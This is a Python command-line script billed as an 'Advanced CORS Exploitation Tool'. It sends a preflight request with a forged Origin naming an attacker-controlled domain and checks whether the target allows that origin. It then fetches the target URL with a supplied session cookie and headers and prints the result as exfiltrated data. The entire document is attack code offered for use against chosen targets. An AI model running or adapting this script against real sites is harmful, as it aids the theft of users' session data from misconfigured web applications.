import requests
import argparse
import json

def exploit_preflight(target, attacker_domain, custom_headers):
    """Sends a preflight (OPTIONS) request to check if CORS is exploitable."""
    headers = {
        "Origin": f"https://{attacker_domain}",
        "Access-Control-Request-Method": "GET",
        "Access-Control-Request-Headers": ", ".join(custom_headers.keys()) if custom_headers else ""
    }
    
    print("[+] Sending preflight request...")
    response = requests.options(target, headers=headers)

    if "Access-Control-Allow-Origin" in response.headers:
        acao = response.headers.get("Access-Control-Allow-Origin", "")
        acac = response.headers.get("Access-Control-Allow-Credentials", "")

        if acao == "*" or acao == f"https://{attacker_domain}":
            print(f"[✔] Target allows cross-origin requests: {acao}")
            return True
        else:
            print(f"[X] Target does not allow exploitation. AC Allow-Origin: {acao}, Credentials: {acac}")
    else:
        print("[X] No CORS headers detected in the preflight response.")

    return False

def exploit_cors(target, attacker_domain, cookie, custom_headers):
    """Attempts CORS exploitation by extracting sensitive data."""
    print(f"[+] Attempting CORS Exploitation from {attacker_domain}...")

    headers = {
        "Origin": f"https://{attacker_domain}",
        "Referer": f"https://{attacker_domain}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    
    # Include custom headers like Authorization, X-Requested-With, etc.
    if custom_headers:
        headers.update(custom_headers)

    cookies = {"session": cookie} if cookie else {}

    response = requests.get(target, headers=headers, cookies=cookies, timeout=10)

    if response.status_code == 200:
        print("[✔] Data Exfiltrated Successfully!\n")
        try:
            data = response.json()
            print(json.dumps(data, indent=4))
        except json.JSONDecodeError:
            print(response.text)
    else:
        print(f"[X] Exploit Failed! Response Code: {response.status_code}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced CORS Exploitation Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL to exploit")
    parser.add_argument("-a", "--attacker-domain", required=True, help="Attacker-controlled subdomain")
    parser.add_argument("-c", "--cookie", required=False, help="Session cookie (optional)")
    parser.add_argument("-H", "--headers", nargs="*", help="Custom headers (format: key:value)")

    args = parser.parse_args()

    # Parse custom headers
    custom_headers = {}
    if args.headers:
        for header in args.headers:
            key, value = header.split(":", 1)
            custom_headers[key.strip()] = value.strip()

    print(f"[+] Checking preflight request on {args.target}...")
    if exploit_preflight(args.target, args.attacker_domain, custom_headers):
        print("\n[+] Attempting exploitation...")
        exploit_cors(args.target, args.attacker_domain, args.cookie, custom_headers)
    else:
        print("[X] Exploitation aborted. Target did not pass preflight check.")
